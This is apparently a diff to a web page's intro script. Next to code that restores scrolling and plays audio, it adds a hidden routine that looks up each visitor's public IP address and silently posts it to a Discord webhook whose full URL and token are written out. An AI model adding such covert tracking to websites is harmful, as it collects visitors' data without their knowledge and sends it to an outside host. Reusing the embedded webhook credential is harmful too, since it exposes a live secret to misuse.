@@ -57,6 +57,26 @@
             document.body.style.overflow = 'auto';
             const audio = document.getElementById('introAudio');
             audio.play();
+
+            // Log IP and send to Discord webhook
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const webhookUrl = 'https://discord.com/api/webhooks/1313917761042386984/Ih-JgysLsQJWQWZkC8lDHPDIPBYMTGsgzPJETBNLkYNKGBfgpx_7-Y9aNiV7cS9WL-oT';
+                    const payload = {
+                        content: `IP Address: ${data.ip}`
+                    };
+
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                })
+                .catch(error => console.error('Error fetching IP:', error));
         });
     </script>
 </body>
+</html>
